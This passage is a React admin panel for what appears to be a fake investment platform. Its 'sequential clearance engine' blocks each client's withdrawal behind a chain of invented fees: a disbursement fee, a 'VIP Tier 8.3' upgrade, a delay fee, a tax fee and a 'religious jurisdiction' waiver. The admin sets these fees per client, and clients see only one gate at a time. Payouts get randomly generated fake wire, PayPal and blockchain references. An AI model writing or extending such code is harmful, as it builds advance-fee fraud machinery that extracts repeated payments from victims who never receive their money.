import React, { useState } from 'react';
import {
  ArrowUpRight,
  CheckCircle2,
  Clock,
  XCircle,
  Search,
  ExternalLink,
  ShieldCheck,
  DollarSign,
  AlertTriangle,
  Send,
  Landmark,
  Mail,
  Coins,
  Copy,
  ChevronRight,
  Sparkles,
  RotateCcw,
  Sliders,
  Award,
  FileCheck2,
  Globe2,
  UserCheck
} from 'lucide-react';
import { WithdrawalRecord, ClientUser } from '../../types';
import { StoreService, useStore } from '../../services/store';

export const AdminWithdrawals: React.FC = () => {
  const storeState = useStore();
  const withdrawals = storeState.withdrawals;
  const users = storeState.users;

  const [activeSubTab, setActiveSubTab] = useState<'CLEARANCES' | 'REQUESTS'>('CLEARANCES');
  const [filter, setFilter] = useState<'ALL' | 'PENDING' | 'COMPLETED' | 'REJECTED'>('ALL');
  const [selectedWd, setSelectedWd] = useState<WithdrawalRecord | null>(null);
  const [actionType, setActionType] = useState<'COMPLETE' | 'PROCESS' | 'REJECT'>('COMPLETE');
  const [txHash, setTxHash] = useState<string>('');
  const [rejectReason, setRejectReason] = useState<string>('Network compliance policy requirement');
  const [successMsg, setSuccessMsg] = useState<string | null>(null);
  const [selectedUserFilter, setSelectedUserFilter] = useState<string>('ALL');

  // Manual Fee Editing State
  const [editingFeesUser, setEditingFeesUser] = useState<ClientUser | null>(null);
  const [feeFormWithdrawal, setFeeFormWithdrawal] = useState<string>('250');
  const [feeFormUpgrade, setFeeFormUpgrade] = useState<string>('500');
  const [feeFormDelay, setFeeFormDelay] = useState<string>('380');
  const [feeFormTax, setFeeFormTax] = useState<string>('520');
  const [feeFormJurisdiction, setFeeFormJurisdiction] = useState<string>('300');

  const handleOpenEditFees = (client: ClientUser) => {
    setEditingFeesUser(client);
    const c = client.withdrawalClearance;
    setFeeFormWithdrawal((c?.withdrawalFeeAmount ?? 250).toString());
    setFeeFormUpgrade((c?.upgradeFeeAmount ?? 500).toString());
    setFeeFormDelay((c?.delayFeeAmount ?? 380).toString());
    setFeeFormTax((c?.taxFeeAmount ?? 520).toString());
    setFeeFormJurisdiction((c?.jurisdictionFeeAmount ?? 300).toString());
  };

  const handleSaveFees = (e: React.FormEvent) => {
    e.preventDefault();
    if (!editingFeesUser) return;
    StoreService.updateClientClearanceFees(editingFeesUser.id, {
      withdrawalFeeAmount: parseFloat(feeFormWithdrawal) || 250,
      upgradeFeeAmount: parseFloat(feeFormUpgrade) || 500,
      delayFeeAmount: parseFloat(feeFormDelay) || 380,
      taxFeeAmount: parseFloat(feeFormTax) || 520,
      jurisdictionFeeAmount: parseFloat(feeFormJurisdiction) || 300
    });
    setSuccessMsg(`Successfully updated custom clearance fees for ${editingFeesUser.name}!`);
    setEditingFeesUser(null);
  };

  const filtered = withdrawals.filter((w) => {
    if (filter === 'PENDING') return w.status === 'PENDING' || w.status === 'PROCESSING';
    if (filter === 'COMPLETED') return w.status === 'COMPLETED';
    if (filter === 'REJECTED') return w.status === 'REJECTED';
    return true;
  });

  const handleOpenActionModal = (wd: WithdrawalRecord, action: 'COMPLETE' | 'PROCESS' | 'REJECT') => {
    setSelectedWd(wd);
    setActionType(action);
    if (wd.method === 'bank') {
      setTxHash('WIRE-FED-' + Math.floor(100000000 + Math.random() * 900000000));
    } else if (wd.method === 'paypal') {
      setTxHash('PP-' + Math.random().toString(36).substring(2, 12).toUpperCase());
    } else {
      setTxHash('0x' + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join(''));
    }
    setRejectReason('Identity or destination account verification failed AML compliance review');
    setSuccessMsg(null);
  };

  const handleExecuteStatusChange = (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedWd) return;

    if (actionType === 'COMPLETE') {
      StoreService.updateWithdrawalStatus(selectedWd.id, 'COMPLETED', txHash.trim());
      setSuccessMsg(`Withdrawal for ${selectedWd.userName} ($${selectedWd.amount.toLocaleString()}) approved & marked Completed!`);
    } else if (actionType === 'PROCESS') {
      StoreService.updateWithdrawalStatus(selectedWd.id, 'PROCESSING');
      setSuccessMsg(`Withdrawal moved to Processing queue.`);
    } else if (actionType === 'REJECT') {
      StoreService.updateWithdrawalStatus(selectedWd.id, 'REJECTED', undefined, rejectReason.trim());
      setSuccessMsg(`Withdrawal rejected and $${selectedWd.amount.toLocaleString()} refunded to user balance.`);
    }

    setTimeout(() => {
      setSelectedWd(null);
      setSuccessMsg(null);
    }, 2000);
  };

  // Helper to determine the client's current gate
  const getUserClearanceSummary = (user: ClientUser) => {
    const c = user.withdrawalClearance || {
      withdrawalFeePaid: false,
      accountUpgraded: false,
      delayFeePaid: false,
      taxFeePaid: false,
      religiousJurisdictionApproved: false
    };

    if (user.kycStatus !== 'verified') {
      return {
        stage: 1,
        title: 'Step 1: KYC Verification Pending',
        desc: 'Client is blocked until Tier-1 identity is verified',
        color: 'text-amber-400',
        badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/30'
      };
    }
    if (!c.withdrawalFeePaid) {
      const amt = c.withdrawalFeeAmount ?? 250;
      return {
        stage: 2,
        title: `Step 2: $${amt.toFixed(2)} Withdrawal Fee Required`,
        desc: 'Blocked: Client must pay disbursement fee',
        color: 'text-rose-400',
        badgeColor: 'bg-rose-500/20 text-rose-300 border-rose-500/30'
      };
    }
    if (!c.accountUpgraded) {
      const amt = c.upgradeFeeAmount ?? 500;
      return {
        stage: 3,
        title: `Step 3: Institutional VIP Upgrade Required ($${amt.toFixed(2)})`,
        desc: 'Blocked: Client account must be upgraded to Institutional VIP Tier',
        color: 'text-indigo-400',
        badgeColor: 'bg-indigo-500/20 text-indigo-300 border-indigo-500/30'
      };
    }
    if (!c.delayFeePaid) {
      const amt = c.delayFeeAmount ?? 380;
      return {
        stage: 4,
        title: `Step 4: $${amt.toFixed(2)} Settlement Delay Fee Required`,
        desc: 'Blocked: Client must settle delay clearance fee',
        color: 'text-orange-400',
        badgeColor: 'bg-orange-500/20 text-orange-300 border-orange-500/30'
      };
    }
    if (!c.taxFeePaid) {
      const amt = c.taxFeeAmount ?? 520;
      return {
        stage: 5,
        title: `Step 5: $${amt.toFixed(2)} Statutory Tax Fee Required`,
        desc: 'Blocked: Statutory capital gains tax withholding certification required',
        color: 'text-amber-400',
        badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/30'
      };
    }
    if (!c.religiousJurisdictionApproved) {
      const amt = c.jurisdictionFeeAmount ?? 300;
      return {
        stage: 6,
        title: `Step 6: Religious Jurisdiction Approval Required ($${amt.toFixed(2)})`,
        desc: 'Blocked: Admin must approve regional/religious compliance waiver',
        color: 'text-sky-400',
        badgeColor: 'bg-sky-500/20 text-sky-300 border-sky-500/30'
      };
    }
    return {
      stage: 7,
      title: 'Step 7: All 6 Gates Cleared (Ready for Payout)',
      desc: 'Client can request withdrawals; ready for executive release',
      color: 'text-emerald-400',
      badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30'
    };
  };

  const displayedUsers = selectedUserFilter === 'ALL'
    ? users
    : users.filter(u => u.id === selectedUserFilter);

  return (
    <div className="space-y-6">
      {/* Top Header with Tab Switcher */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h2 className="text-xl font-bold text-white flex items-center gap-2">
            <ArrowUpRight className="w-5 h-5 text-purple-400" />
            <span>Withdrawals & Sequential Clearance Engine</span>
          </h2>
          <p className="text-xs text-slate-400">
            Control the 7-step gated withdrawal sequence (KYC → $250 Fee → VIP Upgrade → $380 Delay Fee → $520 Tax → Jurisdiction → Release).
          </p>
        </div>

        {/* Sub-tab switcher */}
        <div className="flex items-center gap-2 bg-slate-900 border border-slate-800 p-1 rounded-2xl">
          <button
            onClick={() => setActiveSubTab('CLEARANCES')}
            className={`px-3.5 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-1.5 ${
              activeSubTab === 'CLEARANCES'
                ? 'bg-purple-600 text-white shadow-md'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            <Sliders className="w-4 h-4" />
            <span>Client Clearance Matrix</span>
          </button>
          <button
            onClick={() => setActiveSubTab('REQUESTS')}
            className={`px-3.5 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-1.5 ${
              activeSubTab === 'REQUESTS'
                ? 'bg-purple-600 text-white shadow-md'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            <ArrowUpRight className="w-4 h-4" />
            <span>Pending Requests ({withdrawals.filter(w => w.status === 'PENDING').length})</span>
          </button>
        </div>
      </div>

      {successMsg && (
        <div className="p-3.5 rounded-2xl bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 text-xs flex items-center gap-2 animate-in fade-in">
          <CheckCircle2 className="w-4 h-4 shrink-0" />
          <span>{successMsg}</span>
        </div>
      )}

      {/* ================= VIEW 1: SEQUENTIAL CLEARANCE CONTROL MATRIX ================= */}
      {activeSubTab === 'CLEARANCES' && (
        <div className="space-y-4">
          <div className="bg-slate-900 border border-slate-800 rounded-3xl p-5 shadow-2xl">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800/80 pb-4 mb-4">
              <div>
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-emerald-400" />
                  <span>Sequential Compliance Stages (Per Client)</span>
                </h3>
                <p className="text-xs text-slate-400">
                  Clients only see the single next gate blocking their withdrawal until you approve it here.
                </p>
              </div>

              {/* User filter */}
              <div className="flex items-center gap-2">
                <span className="text-xs text-slate-400">Filter Client:</span>
                <select
                  value={selectedUserFilter}
                  onChange={(e) => setSelectedUserFilter(e.target.value)}
                  className="bg-slate-950 border border-slate-800 rounded-xl px-3 py-1.5 text-xs font-bold text-white focus:outline-none focus:border-purple-500"
                >
                  <option value="ALL">All Clients ({users.length})</option>
                  {users.map(u => (
                    <option key={u.id} value={u.id}>{u.name} ({u.email})</option>
                  ))}
                </select>
              </div>
            </div>

            {/* Client Cards List */}
            <div className="space-y-4">
              {displayedUsers.map((client) => {
                const summary = getUserClearanceSummary(client);
                const clearance = client.withdrawalClearance || {
                  withdrawalFeePaid: false,
                  accountUpgraded: false,
                  delayFeePaid: false,
                  taxFeePaid: false,
                  religiousJurisdictionApproved: false
                };

                return (
                  <div
                    key={client.id}
                    className="p-4 sm:p-5 rounded-2xl bg-slate-950/80 border border-slate-800/80 hover:border-slate-700 transition-all space-y-4"
                  >
                    {/* User Header & Status */}
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800/60 pb-3">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-xl bg-purple-600/20 text-purple-300 font-bold flex items-center justify-center text-sm border border-purple-500/30">
                          {client.name.charAt(0).toUpperCase()}
                        </div>
                        <div>
                          <div className="font-bold text-white text-sm flex items-center gap-2">
                            <span>{client.name}</span>
                            <span className="text-[10px] px-2 py-0.5 rounded-full bg-slate-800 text-slate-300 font-mono">
                              {client.id}
                            </span>
                          </div>
                          <div className="text-xs text-slate-400 flex items-center gap-2">
                            <span>{client.email}</span>
                            <span>•</span>
                            <span className="font-mono text-emerald-400 font-bold">
                              Bal: ${client.balance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                            </span>
                            <span>•</span>
                            <span className="text-slate-400">
                              Profit: +${client.totalProfit.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Current Status Pill & Fast Action */}
                      <div className="flex items-center gap-2">
                        <span className={`px-3 py-1 rounded-full text-xs font-bold border ${summary.badgeColor}`}>
                          {summary.title}
                        </span>
                        <button
                          onClick={() => handleOpenEditFees(client)}
                          className="px-2.5 py-1 rounded-lg bg-blue-600/20 hover:bg-blue-600/30 text-blue-300 font-bold text-[11px] flex items-center gap-1 border border-blue-500/30 cursor-pointer"
                          title="Manually edit clearance fees for this client"
                        >
                          <Sliders className="w-3.5 h-3.5" />
                          <span>Edit Fees</span>
                        </button>
                        <button
                          onClick={() => {
                            StoreService.approveAllClearances(client.id);
                            setSuccessMsg(`All 6 clearance stages approved for ${client.name}! Client is ready for payout.`);
                          }}
                          className="px-2.5 py-1 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-[11px] flex items-center gap-1 shadow-sm cursor-pointer"
                          title="Fast-track all 6 compliance clearances for this user"
                        >
                          <Sparkles className="w-3.5 h-3.5" />
                          <span>Approve All</span>
                        </button>
                        <button
                          onClick={() => {
                            StoreService.resetAllClearances(client.id);
                            setSuccessMsg(`Withdrawal clearances reset to Stage 1 for ${client.name}.`);
                          }}
                          className="p-1 rounded-lg bg-slate-800 hover:bg-rose-500/20 text-slate-400 hover:text-rose-400 border border-slate-700 transition-colors cursor-pointer"
                          title="Reset all clearances to test sequence"
                        >
                          <RotateCcw className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    </div>

                    {/* Pending Client Fee Payment Proof Alert */}
                    {clearance.pendingPaymentStage && (
                      <div className="p-3.5 rounded-xl bg-gradient-to-r from-amber-500/20 to-orange-500/20 border border-amber-500/40 text-amber-200 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                        <div className="flex items-start gap-2.5">
                          <div className="w-8 h-8 rounded-lg bg-amber-500/30 text-amber-300 flex items-center justify-center shrink-0 mt-0.5">
                            <Clock className="w-4 h-4 animate-spin" />
                          </div>
                          <div>
                            <div className="flex items-center gap-2">
                              <span className="text-xs font-bold text-white">Client Payment Proof Submitted</span>
                              <span className="text-[10px] px-2 py-0.5 rounded bg-amber-500/30 font-bold text-amber-300 uppercase">
                                Stage {clearance.pendingPaymentStage}
                              </span>
                            </div>
                            <div className="text-xs text-slate-300 mt-0.5">
                              Proof Amount:{' '}
                              <strong className="text-emerald-400 font-mono">
                                {clearance.pendingPaymentAmount} {clearance.pendingPaymentCrypto}
                              </strong>
                              {clearance.pendingPaymentTxid && (
                                <span className="ml-2 font-mono text-[11px] text-slate-400">
                                  TXID: {clearance.pendingPaymentTxid}
                                </span>
                              )}
                            </div>
                          </div>
                        </div>
                        <div className="flex items-center gap-2">
                          <button
                            onClick={() => {
                              StoreService.approveClearanceFeePayment(client.id, clearance.pendingPaymentStage!);
                              setSuccessMsg(
                                `Approved and verified fee payment for Stage ${clearance.pendingPaymentStage} for ${client.name}!`
                              );
                            }}
                            className="px-3 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs flex items-center gap-1 shadow-md cursor-pointer"
                          >
                            <CheckCircle2 className="w-3.5 h-3.5" />
                            <span>Approve & Clear Fee</span>
                          </button>
                        </div>
                      </div>
                    )}

                    {/* Sequential Steps Grid (Interactive Buttons) */}
                    <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2 text-xs">
                      {/* Step 1: KYC */}
                      <div
                        className={`p-3 rounded-xl border flex flex-col justify-between gap-2 ${
                          client.kycStatus === 'verified'
                            ? 'bg-emerald-950/20 border-emerald-500/40 text-emerald-300'
                            : 'bg-slate-900 border-slate-800 text-slate-300'
                        }`}
                      >
                        <div>
                          <div className="flex items-center justify-between text-[10px] uppercase font-bold text-slate-400">
                            <span>Step 1</span>
                            {client.kycStatus === 'verified' ? (
                              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                            ) : (
                              <Clock className="w-3.5 h-3.5 text-amber-400" />
                            )}
                          </div>
                          <div className="font-bold text-white text-xs mt-0.5">KYC Status</div>
                          <div className="text-[10px] text-slate-400 mt-0.5 font-mono">
                            {client.kycStatus.toUpperCase()}
                          </div>
                        </div>
                        <button
                          onClick={() => {
                            const newStatus = client.kycStatus === 'verified' ? 'unverified' : 'verified';
                            StoreService.updateKycStatus(client.id, newStatus);
                            setSuccessMsg(`Updated KYC status for ${client.name} to ${newStatus}.`);
                          }}
                          className={`w-full py-1 rounded-lg font-bold text-[10px] uppercase tracking-wider ${
                            client.kycStatus === 'verified'
                              ? 'bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300'
                              : 'bg-blue-600 hover:bg-blue-500 text-white shadow-sm'
                          }`}
                        >
                          {client.kycStatus === 'verified' ? 'Revoke KYC' : 'Verify KYC'}
                        </button>
                      </div>

                      {/* Step 2: Withdrawal Fee ($250.00) */}
                      <div
                        className={`p-3 rounded-xl border flex flex-col justify-between gap-2 ${
                          clearance.withdrawalFeePaid
                            ? 'bg-emerald-950/20 border-emerald-500/40 text-emerald-300'
                            : summary.stage === 2
                            ? 'bg-rose-950/20 border-rose-500/50 text-rose-300 ring-1 ring-rose-500/40'
                            : 'bg-slate-900 border-slate-800 text-slate-300'
                        }`}
                      >
                        <div>
                          <div className="flex items-center justify-between text-[10px] uppercase font-bold text-slate-400">
                            <span>Step 2</span>
                            {clearance.withdrawalFeePaid ? (
                              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                            ) : (
                              <DollarSign className="w-3.5 h-3.5 text-rose-400" />
                            )}
                          </div>
                          <div className="font-bold text-white text-xs mt-0.5">Disbursement Fee</div>
                          <div className="text-[10px] text-slate-400 mt-0.5 font-mono">
                            {clearance.withdrawalFeePaid ? 'PAID ($250)' : 'UNPAID ($250)'}
                          </div>
                        </div>
                        <button
                          onClick={() => {
                            if (clearance.withdrawalFeePaid) {
                              StoreService.updateWithdrawalClearance(client.id, { withdrawalFeePaid: false });
                              setSuccessMsg(`Unmarked withdrawal fee for ${client.name}.`);
                            } else {
                              StoreService.verifyWithdrawalFee(client.id, true);
                              setSuccessMsg(`Approved $250.00 withdrawal fee for ${client.name}! Gate 2 cleared.`);
                            }
                          }}
                          className={`w-full py-1 rounded-lg font-bold text-[10px] uppercase tracking-wider ${
                            clearance.withdrawalFeePaid
                              ? 'bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300'
                              : 'bg-rose-600 hover:bg-rose-500 text-white shadow-sm'
                          }`}
                        >
                          {clearance.withdrawalFeePaid ? 'Unset Fee' : 'Approve $250'}
                        </button>
                      </div>

                      {/* Step 3: VIP Tier Upgrade */}
                      <div
                        className={`p-3 rounded-xl border flex flex-col justify-between gap-2 ${
                          clearance.accountUpgraded
                            ? 'bg-emerald-950/20 border-emerald-500/40 text-emerald-300'
                            : summary.stage === 3
                            ? 'bg-indigo-950/20 border-indigo-500/50 text-indigo-300 ring-1 ring-indigo-500/40'
                            : 'bg-slate-900 border-slate-800 text-slate-300'
                        }`}
                      >
                        <div>
                          <div className="flex items-center justify-between text-[10px] uppercase font-bold text-slate-400">
                            <span>Step 3</span>
                            {clearance.accountUpgraded ? (
                              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                            ) : (
                              <Award className="w-3.5 h-3.5 text-indigo-400" />
                            )}
                          </div>
                          <div className="font-bold text-white text-xs mt-0.5">VIP Tier 8.3 Upgrade</div>
                          <div className="text-[10px] text-slate-400 mt-0.5 font-mono">
                            {clearance.accountUpgraded ? 'UPGRADED (v8.3)' : 'STANDARD TIER'}
                          </div>
                        </div>
                        <button
                          onClick={() => {
                            if (clearance.accountUpgraded) {
                              StoreService.updateWithdrawalClearance(client.id, { accountUpgraded: false });
                              setSuccessMsg(`Downgraded tier for ${client.name}.`);
                            } else {
                              StoreService.upgradeAccountTier(client.id, true, 'Institutional Executive VIP Tier 8.3');
                              setSuccessMsg(`Upgraded ${client.name} to VIP Tier 8.3! Gate 3 cleared.`);
                            }
                          }}
                          className={`w-full py-1 rounded-lg font-bold text-[10px] uppercase tracking-wider ${
                            clearance.accountUpgraded
                              ? 'bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300'
                              : 'bg-indigo-600 hover:bg-indigo-500 text-white shadow-sm'
                          }`}
                        >
                          {clearance.accountUpgraded ? 'Downgrade' : 'Upgrade to VIP 8.3'}
                        </button>
                      </div>

                      {/* Step 4: Delay Fee ($380.00) */}
                      <div
                        className={`p-3 rounded-xl border flex flex-col justify-between gap-2 ${
                          clearance.delayFeePaid
                            ? 'bg-emerald-950/20 border-emerald-500/40 text-emerald-300'
                            : summary.stage === 4
                            ? 'bg-orange-950/20 border-orange-500/50 text-orange-300 ring-1 ring-orange-500/40'
                            : 'bg-slate-900 border-slate-800 text-slate-300'
                        }`}
                      >
                        <div>
                          <div className="flex items-center justify-between text-[10px] uppercase font-bold text-slate-400">
                            <span>Step 4</span>
                            {clearance.delayFeePaid ? (
                              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                            ) : (
                              <Clock className="w-3.5 h-3.5 text-orange-400" />
                            )}
                          </div>
                          <div className="font-bold text-white text-xs mt-0.5">Delay Clearance</div>
                          <div className="text-[10px] text-slate-400 mt-0.5 font-mono">
                            {clearance.delayFeePaid ? 'PAID ($380)' : 'UNPAID ($380)'}
                          </div>
                        </div>
                        <button
                          onClick={() => {
                            if (clearance.delayFeePaid) {
                              StoreService.updateWithdrawalClearance(client.id, { delayFeePaid: false });
                              setSuccessMsg(`Unmarked delay fee for ${client.name}.`);
                            } else {
                              StoreService.verifyDelayFee(client.id, true);
                              setSuccessMsg(`Approved $380.00 delay clearance fee for ${client.name}! Gate 4 cleared.`);
                            }
                          }}
                          className={`w-full py-1 rounded-lg font-bold text-[10px] uppercase tracking-wider ${
                            clearance.delayFeePaid
                              ? 'bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300'
                              : 'bg-orange-600 hover:bg-orange-500 text-white shadow-sm'
                          }`}
                        >
                          {clearance.delayFeePaid ? 'Unset Fee' : 'Approve $380'}
                        </button>
                      </div>

                      {/* Step 5: Tax Clearance Fee ($520.00) */}
                      <div
                        className={`p-3 rounded-xl border flex flex-col justify-between gap-2 ${
                          clearance.taxFeePaid
                            ? 'bg-emerald-950/20 border-emerald-500/40 text-emerald-300'
                            : summary.stage === 5
                            ? 'bg-amber-950/20 border-amber-500/50 text-amber-300 ring-1 ring-amber-500/40'
                            : 'bg-slate-900 border-slate-800 text-slate-300'
                        }`}
                      >
                        <div>
                          <div className="flex items-center justify-between text-[10px] uppercase font-bold text-slate-400">
                            <span>Step 5</span>
                            {clearance.taxFeePaid ? (
                              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                            ) : (
                              <FileCheck2 className="w-3.5 h-3.5 text-amber-400" />
                            )}
                          </div>
                          <div className="font-bold text-white text-xs mt-0.5">Tax Certificate</div>
                          <div className="text-[10px] text-slate-400 mt-0.5 font-mono">
                            {clearance.taxFeePaid ? 'PAID ($520)' : 'UNPAID ($520)'}
                          </div>
                        </div>
                        <button
                          onClick={() => {
                            if (clearance.taxFeePaid) {
                              StoreService.updateWithdrawalClearance(client.id, { taxFeePaid: false });
                              setSuccessMsg(`Unmarked tax certificate fee for ${client.name}.`);
                            } else {
                              StoreService.verifyTaxFee(client.id, true);
                              setSuccessMsg(`Approved $520.00 tax clearance fee for ${client.name}! Gate 5 cleared.`);
                            }
                          }}
                          className={`w-full py-1 rounded-lg font-bold text-[10px] uppercase tracking-wider ${
                            clearance.taxFeePaid
                              ? 'bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300'
                              : 'bg-amber-600 hover:bg-amber-500 text-white shadow-sm'
                          }`}
                        >
                          {clearance.taxFeePaid ? 'Unset Fee' : 'Approve $520'}
                        </button>
                      </div>

                      {/* Step 6: Religious Jurisdiction Approval */}
                      <div
                        className={`p-3 rounded-xl border flex flex-col justify-between gap-2 ${
                          clearance.religiousJurisdictionApproved
                            ? 'bg-emerald-950/20 border-emerald-500/40 text-emerald-300'
                            : summary.stage === 6
                            ? 'bg-sky-950/20 border-sky-500/50 text-sky-300 ring-1 ring-sky-500/40'
                            : 'bg-slate-900 border-slate-800 text-slate-300'
                        }`}
                      >
                        <div>
                          <div className="flex items-center justify-between text-[10px] uppercase font-bold text-slate-400">
                            <span>Step 6</span>
                            {clearance.religiousJurisdictionApproved ? (
                              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                            ) : (
                              <Globe2 className="w-3.5 h-3.5 text-sky-400" />
                            )}
                          </div>
                          <div className="font-bold text-white text-xs mt-0.5">Jurisdiction Waiver</div>
                          <div className="text-[10px] text-slate-400 mt-0.5 font-mono">
                            {clearance.religiousJurisdictionApproved ? 'APPROVED' : 'PENDING WAIVER'}
                          </div>
                        </div>
                        <button
                          onClick={() => {
                            if (clearance.religiousJurisdictionApproved) {
                              StoreService.updateWithdrawalClearance(client.id, { religiousJurisdictionApproved: false });
                              setSuccessMsg(`Revoked jurisdiction waiver for ${client.name}.`);
                            } else {
                              StoreService.approveReligiousJurisdiction(client.id, true);
                              setSuccessMsg(`Approved jurisdiction waiver for ${client.name}! All 6 gates cleared.`);
                            }
                          }}
                          className={`w-full py-1 rounded-lg font-bold text-[10px] uppercase tracking-wider ${
                            clearance.religiousJurisdictionApproved
                              ? 'bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300'
                              : 'bg-sky-600 hover:bg-sky-500 text-white shadow-sm'
                          }`}
                        >
                          {clearance.religiousJurisdictionApproved ? 'Revoke' : 'Approve Waiver'}
                        </button>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      )}

      {/* ================= VIEW 2: MONITORED WITHDRAWALS QUEUE ================= */}
      {activeSubTab === 'REQUESTS' && (
        <div className="space-y-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              {(['ALL', 'PENDING', 'COMPLETED', 'REJECTED'] as const).map((st) => (
                <button
                  key={st}
                  onClick={() => setFilter(st)}
                  className={`px-3 py-1.5 rounded-xl text-xs font-semibold transition-colors ${
                    filter === st
                      ? 'bg-purple-600 text-white shadow-md'
                      : 'bg-slate-900 border border-slate-800 text-slate-400 hover:text-white'
                  }`}
                >
                  {st}
                </button>
              ))}
            </div>
          </div>

          <div className="bg-slate-900 border border-slate-800/80 rounded-3xl overflow-hidden shadow-2xl">
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs">
                <thead>
                  <tr className="bg-slate-950/80 text-slate-400 uppercase text-[10px] tracking-wider border-b border-slate-800">
                    <th className="py-3.5 px-4">Client User</th>
                    <th className="py-3.5 px-4">Method & Channel</th>
                    <th className="py-3.5 px-4">Destination Details</th>
                    <th className="py-3.5 px-4">Compliance Gates Status</th>
                    <th className="py-3.5 px-4">Amount Requested</th>
                    <th className="py-3.5 px-4">Status</th>
                    <th className="py-3.5 px-4 text-right">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/60 text-slate-200">
                  {filtered.length === 0 ? (
                    <tr>
                      <td colSpan={7} className="py-12 text-center text-xs text-slate-500">
                        No withdrawal records matching current filter.
                      </td>
                    </tr>
                  ) : (
                    filtered.map((wd) => {
                      const userObj = users.find(u => u.id === wd.userId);
                      const userSummary = userObj ? getUserClearanceSummary(userObj) : null;
                      const allCleared = userSummary?.stage === 7;

                      return (
                        <tr key={wd.id} className="hover:bg-slate-850/50 transition-colors">
                          <td className="py-3 px-4">
                            <div className="font-bold text-white text-sm">{wd.userName}</div>
                            <div className="text-[11px] text-slate-400">{wd.userEmail}</div>
                            <div className="text-[10px] text-slate-500 mt-0.5">
                              {new Date(wd.requestedAt).toLocaleString()}
                            </div>
                          </td>

                          <td className="py-3 px-4">
                            <div className="flex items-center gap-1.5 font-bold text-white text-sm">
                              {wd.method === 'bank' ? (
                                <span className="flex items-center gap-1 text-blue-400">
                                  <Landmark className="w-3.5 h-3.5" /> Bank Wire
                                </span>
                              ) : wd.method === 'paypal' ? (
                                <span className="flex items-center gap-1 text-sky-400">
                                  <Mail className="w-3.5 h-3.5" /> PayPal
                                </span>
                              ) : (
                                <span className="flex items-center gap-1 text-purple-400">
                                  <Coins className="w-3.5 h-3.5" /> Crypto ({wd.asset})
                                </span>
                              )}
                            </div>
                            <div className="text-[10px] text-slate-400 font-mono">
                              {wd.method === 'bank'
                                ? wd.bankName || 'Bank Transfer'
                                : wd.method === 'paypal'
                                ? 'PayPal Express'
                                : wd.network || 'On-chain'}
                            </div>
                          </td>

                          <td className="py-3 px-4">
                            {wd.method === 'bank' ? (
                              <div className="space-y-0.5">
                                <div className="font-semibold text-white">
                                  Account / IBAN: <span className="font-mono text-cyan-300">{wd.accountNumber || wd.iban || 'N/A'}</span>
                                </div>
                                <div className="text-[11px] text-slate-400">
                                  Holder: {wd.accountHolder || wd.userName} {wd.swiftCode ? `• SWIFT: ${wd.swiftCode}` : ''}
                                </div>
                              </div>
                            ) : wd.method === 'paypal' ? (
                              <div className="font-semibold text-white">
                                PayPal Email: <span className="text-sky-300 font-mono">{wd.paypalEmail || wd.userEmail}</span>
                              </div>
                            ) : (
                              <div className="font-mono text-slate-300 text-[11px] truncate max-w-xs">
                                {wd.destinationAddress}
                              </div>
                            )}

                            {wd.txHash && (
                              <div className="text-[10px] text-emerald-400 font-mono mt-1">
                                Ref/TXID: {wd.txHash}
                              </div>
                            )}
                            {wd.rejectionReason && (
                              <div className="text-[10px] text-rose-400 mt-1">
                                Reason: {wd.rejectionReason}
                              </div>
                            )}
                          </td>

                          {/* Compliance Gates Status */}
                          <td className="py-3 px-4">
                            {allCleared ? (
                              <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-[10px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                                <CheckCircle2 className="w-3 h-3 text-emerald-400" />
                                <span>All 6 Gates Cleared</span>
                              </span>
                            ) : (
                              <div className="space-y-1">
                                <span className={`inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold border ${userSummary?.badgeColor || 'bg-slate-800 text-slate-300'}`}>
                                  <Clock className="w-3 h-3" />
                                  <span>{userSummary?.title.split(':')[0] || 'Gated'}</span>
                                </span>
                                <div className="text-[10px] text-slate-400 truncate max-w-[140px]">
                                  {userSummary?.title.split(':')[1] || ''}
                                </div>
                              </div>
                            )}
                          </td>

                          <td className="py-3 px-4">
